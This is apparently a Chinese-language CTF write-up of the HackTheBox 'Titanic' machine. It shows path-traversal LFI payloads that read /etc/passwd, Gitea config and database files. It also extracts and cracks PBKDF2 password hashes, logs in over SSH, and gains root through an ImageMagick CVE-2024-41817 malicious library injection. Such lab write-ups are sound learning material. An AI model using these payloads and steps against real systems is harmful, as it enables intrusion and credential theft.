# Titanic
### hackmd link:[hackmd](https://hackmd.io/@yeyeye618/Bye_-xZllg)
![image](https://hackmd.io/_uploads/SJ9xm4-Hle.png)
---

nmap 掃描結果:
![image](https://hackmd.io/_uploads/S1BY-xbexe.png)
有開 ssh port

用 gobuster 掃描，發現有指定網域
![image](https://hackmd.io/_uploads/Hy0R7g-gee.png)
要改 /etc/hosts

```
echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
```

這樣就看到頁面了
![image](https://hackmd.io/_uploads/S1iC7EZBgx.png)
有訂票的功能
![image](https://hackmd.io/_uploads/SJQLNEbrxx.png)
會下載訂票的輸入內容

開 burpsuite 看
找到負責下載 json 的 request
![image](https://hackmd.io/_uploads/SJSr2x1Wgx.png)

嘗試 LFI 
`../../../../etc/passwd`
![image](https://hackmd.io/_uploads/ryR9hx1blx.png)
成功

```
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```
這兩個有 bash 的權限

撈撈看其他的
`../../../../etc/shadow`
![image](https://hackmd.io/_uploads/rJZYpx1-gx.png)
沒有

看看環境
`../../../../etc/environment`
![image](https://hackmd.io/_uploads/Hke8rIk-lx.png)

看看domain
`../../../../etc/hosts`
![image](https://hackmd.io/_uploads/HkD_UIJWeg.png)
看到有 dev.titanic.htb 這個 domain

要再加上 domain
![image](https://hackmd.io/_uploads/Sk7XOLy-gg.png)

到 dev.titanic.htb 看看 
就出現這個 gitea
![image](https://hackmd.io/_uploads/ryeduL1bxl.png)

看起來有前後端
![image](https://hackmd.io/_uploads/Hkj6_8yZeg.png)

前端就簡單的 python flask 框架
![image](https://hackmd.io/_uploads/By9NKIJ-lg.png)
還有兩個json檔
![image](https://hackmd.io/_uploads/BkI5oUJbeg.png)



後端有 gitea 跟 mysql 的 docker 設定檔
![image](https://hackmd.io/_uploads/HyM2FUy-xx.png)

gitea:
![image](https://hackmd.io/_uploads/BJqHoLkbee.png)
有一個 /home/developer/gitea/data 的 path (容器)

mysql:
![image](https://hackmd.io/_uploads/B1OmqUk-gl.png)

看到了 mysql 的 root password

研究 gitea 配置
[gitea](https://docs.gitea.com/)

查詢config檔相關路徑
![image](https://hackmd.io/_uploads/Hyn-sk5bgl.png)
![image](https://hackmd.io/_uploads/S11Ei15bee.png)
嘗試下載/conf/app.ini
```
../../../../home/developer/gitea/data/conf/app.ini
```
![image](https://hackmd.io/_uploads/H14bZlcbxx.png)
失敗

想不到為啥

看到這個
![image](https://hackmd.io/_uploads/B1o5IVZHex.png)
volumes 再加上 container 試試

```
../../../../home/developer/gitea/data/gitea/conf/app.ini
```

成功!!
![image](https://hackmd.io/_uploads/rJPmEe5Wgx.png)

config 有寫 database 資料的路徑
![image](https://hackmd.io/_uploads/SymwEx5Wgx.png)
而且寫了 database 是用 sqlite


撈撈看
```
../../../../home/developer/gitea/data/gitea/gitea.db
```
![image](https://hackmd.io/_uploads/Hy6P_l9bxg.png)

很多東西
在找 admin 的時候看到奇怪的東西
![image](https://hackmd.io/_uploads/SJEDsxqZxe.png)

看起來是使用者的帳號內容，比較難看懂

把結果抓下來用 sqlite 打開看看
![image](https://hackmd.io/_uploads/HkVAiITMxg.png)
找 user 這個 table
![image](https://hackmd.io/_uploads/HkbQ3I6Mge.png)
有這兩個使用者

```
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732
d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|
0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US|
|1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|
root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0

2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a543
85ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|
0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US|
|1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|
developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0

```
看看 user 的欄位名稱
![image](https://hackmd.io/_uploads/HyMgAUaMxg.png)
可以看到第 7、8 分別是 密碼 hash 值跟 hash 的演算法
還有 17 是 salt 值
分別是
```
hash_algo = pbkdf2$50000$50

// administrator
passwd = 
cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980
c47c5d017136
salt = 2d149e5fbd1b20cf31db3e3c6a28fc9b

// developer
passwd = e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf16826192634
44ea594cfb56
salt = 8bf3e3452b78544f8bee9400d6936d34
```
轉成對應格式
```
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAY
qOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=

developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEB
rfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

![image](https://hackmd.io/_uploads/ryT0PH4mxx.png)
取的了 developer 的密碼

之前 nmap 有掃到 ssh 的 port
連連看
```
$ ssh developer@10.10.11.55
developer@10.10.11.55's password: 25282528
```
![image](https://hackmd.io/_uploads/HJoD3BVmlx.png)
成功

路徑下有 user flag
![image](https://hackmd.io/_uploads/ryCrtBEXee.png)
```
c592e701fd6103eaf353f77298b694ad
```

找找看 root flag
![image](https://hackmd.io/_uploads/r1oWNiMEgl.png)
看起來是這個在 `/root` 底下的，但還需要提權到 admin

沒有什麼想法，我就找找專案的資料夾

專案資料夾:
![image](https://hackmd.io/_uploads/HJr53KMNgg.png)
有個 `identify_images.sh`

![image](https://hackmd.io/_uploads/rkcGTFfVeg.png)
會把 jpg 用 ImageMagick 這個工具加到 metadata.log 裡面

![image](https://hackmd.io/_uploads/H15Wlcf4gg.png)
magick 的版本是 7.1.1-35
有相關的 CVE
![image](https://hackmd.io/_uploads/r1RbGqzVll.png)

具體的漏洞點在於 magick 在 `MAGICK_CONFIGURE_PATH`(參數路徑) 和 `LD_LIBRARY_PATH` (動態涵式庫) 的設定出現錯誤，多了「 `::` 」 的符號，這會讓 magick 從當前目錄調用 `LD_LIBRARY_PATH` 和 `MAGICK_CONFIGURE_PATH` 

所以，攻擊者可以在調用 magick 的目錄注入 有問題的`.xml`檔或著是`.so`檔 來讓 magick 錯誤執行有問題的程式碼
相關漏洞可以看
[CVE-2024-41817 Detail](https://nvd.nist.gov/vuln/detail/cve-2024-41817)
[Arbitrary Code Execution in AppImage version ImageMagick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

在 `/opt/app/static/assets/images/`目錄下寫一個假的動態函式庫

![image](https://hackmd.io/_uploads/HJ3Kgsf4ee.png)

結果在寫完之後 `identify_images.sh` 就被執行了，就成功撈到 root flag
```
ec408f0d6c868b7698e6ea81330eb7c6
```
